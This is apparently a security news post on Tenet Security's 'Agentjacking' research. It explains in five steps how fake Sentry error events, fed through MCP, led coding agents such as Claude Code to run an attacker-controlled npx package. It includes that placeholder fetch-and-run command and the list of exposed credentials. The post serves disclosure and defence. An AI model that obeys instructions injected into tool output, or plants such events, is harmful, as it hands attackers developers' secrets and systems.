---
title: "Agentjacking: How a Fake Bug Report Can Hijack Your AI Coding Agent"
summary: "Tenet Security's Agentjacking research shows how attackers exploit Sentry's public DSN and MCP to turn Claude Code, Cursor, and Codex into unwitting malware launchers — with an 85% success rate and 2,388 organizations exposed."
category: "hot-issue"
date: "2026-06-14"
readingTime: 5
tags: ["agentjacking", "ai-security", "mcp", "sentry", "coding-agent"]
---

<div class="article-tldr">
<strong>TL;DR:</strong> Security firm Tenet Security has disclosed "Agentjacking," a new attack class that hijacks AI coding agents using nothing but a crafted Sentry error report. No malware, no stolen credentials, no traditional breach — just a POST request to a public endpoint. Claude Code, Cursor, and Codex all executed attacker-controlled code in controlled tests, with an 85% success rate across more than 100 agent sessions.
</div>

<div class="article-video" style="margin:32px 0;"><div style="position:relative;padding-bottom:56.25%;height:0;overflow:hidden;border-radius:10px;"><iframe src="https://www.youtube-nocookie.com/embed/5ZA1lTxTH3c" title="Agentjacking PoC Demo – Tenet Security Threat Labs" loading="lazy" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen style="position:absolute;top:0;left:0;width:100%;height:100%;border:0;"></iframe></div></div>

## The Trust Problem at the Heart of AI Agents

AI coding agents in 2026 do far more than autocomplete. Tools like Claude Code, Cursor, and Codex connect to external services through the Model Context Protocol (MCP) and act on the data they receive as if it were trusted system input. That implicit trust is exactly what Agentjacking exploits.

When a developer tells their coding agent to "fix unresolved Sentry issues," the agent queries Sentry via MCP and treats every returned error event as legitimate guidance. It cannot distinguish a real application crash from an attacker-injected payload — and that distinction is everything.

<div class="article-callout tip">
<div class="article-callout__icon">💡</div>
<div class="article-callout__body"><strong>What makes Agentjacking different</strong><br>Traditional supply chain attacks require compromising infrastructure or stealing credentials. Agentjacking requires neither. The attacker never touches the target's systems — they just write to a public endpoint and let the agent do the rest.</div>
</div>

## How the Attack Works: Five Steps to Execution

**Step 1 — Harvest the DSN.** Sentry's Data Source Name (DSN) is a public, write-only credential intentionally embedded in frontend JavaScript. It's designed to be public. An attacker can extract it from any production website's source code.

**Step 2 — Inject a fake error event.** Using only the DSN, the attacker POSTs a crafted error event to Sentry's ingestion endpoint. No authentication required beyond the DSN.

**Step 3 — Disguise it as official guidance.** The injected event contains a carefully formatted "Resolution" section in the message field and context key names. When returned to the agent via the Sentry MCP server, it looks structurally and visually identical to Sentry's own remediation templates.

**Step 4 — The agent receives the payload as trusted output.** When the developer asks the agent to fix Sentry issues, the agent queries MCP and receives the malicious event as if it were a legitimate diagnostic result.

**Step 5 — Execution with full developer privileges.** The agent runs `npx @attacker-controlled-package --diagnose`, downloading and executing the package from the public npm registry with the developer's own permissions.

<div class="article-stats">
<div class="stat-item"><span class="stat-number">2,388</span><span class="stat-label">Organizations exposed (Fortune 500 included)</span></div>
<div class="stat-item"><span class="stat-number">85%</span><span class="stat-label">Success rate in controlled tests</span></div>
<div class="stat-item"><span class="stat-number">100+</span><span class="stat-label">Agent executions confirmed</span></div>
</div>

## What an Attacker Can Reach

A single successful Agentjacking session can expose:

| Asset | Examples |
|---|---|
| Environment variables | API keys, database credentials |
| Cloud credentials | AWS access keys, GCP service accounts |
| Source code access | GitHub tokens, private repository URLs |
| CI/CD pipelines | Deployment secrets, signing keys |
| Persistent access | Backdoor installation, persistent remote access |

## Why Existing Defenses Fail

Tenet named the underlying mechanism the **"Authorized Intent Chain"**: every step in the attack chain is individually authorized. This is why it slips through EDR, firewalls, IAM policies, and VPNs — there is nothing unauthorized to detect.

Prompt engineering doesn't help either. Tenet explicitly instructed agents to ignore untrusted data. The agents ran the payload anyway, because MCP tool responses are not treated as untrusted user input — they come in as internal system signals.

<div class="article-callout info">
<div class="article-callout__icon">⚠️</div>
<div class="article-callout__body"><strong>The vulnerability is not just in Sentry</strong><br>The fundamental flaw is in how agents handle any external data source. GitHub issues, support tickets, documentation — any data channel connected to an agent through MCP carries the same risk. A separate recent test phished an AI email agent into leaking AWS keys via a single crafted email.</div>
</div>

## Sentry's Response

Tenet responsibly disclosed the issue to Sentry on June 3, 2026. Sentry's leadership responded the same day, acknowledging the problem but declining to fix it at the root, calling it **"technically not defensible."** Sentry subsequently added a content filter blocking one specific payload string — addressing the symptom while leaving the root cause intact.

## Practical Defenses

<div class="article-keypoints">
<ul>
<li>Configure AI agents to require human approval before executing code derived from MCP tool responses</li>
<li>Apply least-privilege principles to agent sessions — avoid granting full developer permissions</li>
<li>Require human review before any npm/pip install or npx command suggested by an agent</li>
<li>Add system prompt instructions that explicitly classify MCP tool output as untrusted external data</li>
<li>Audit which MCP servers your agents connect to, and inventory your exposed Sentry DSNs</li>
<li>Implement real-time monitoring and alerting for commands executed during agent sessions</li>
</ul>
</div>

## The Bigger Picture

Agentjacking is not an edge case. It is a structural consequence of giving AI agents write access to production systems while trusting the data those agents read from external sources. The agents that are most capable are also the most dangerous to compromise — and Agentjacking shows that "compromise" no longer requires an attacker to break anything.

As Tenet concludes: the only place left to stop this is the moment the agent decides to act.

<div class="article-callout info"><div class="article-callout__icon">🔗</div><div class="article-callout__body"><strong>Resources · Official Sources · How to Get Started</strong><br>— <a href="https://tenetsecurity.ai/blog/agentjacking-coding-agents-with-fake-sentry-errors/" target="_blank" rel="noopener noreferrer">Tenet Security: Full Agentjacking Research Report</a><br>— <a href="https://thehackernews.com/2026/06/agentjacking-attack-tricks-ai-coding.html" target="_blank" rel="noopener noreferrer">The Hacker News: Agentjacking Attack Deep Dive</a><br>— <a href="https://www.infosecurity-magazine.com/news/agentjacking-attacks-hijack-ai/" target="_blank" rel="noopener noreferrer">Infosecurity Magazine: How to Defend Against AI Agent Hijacking</a></div></div>
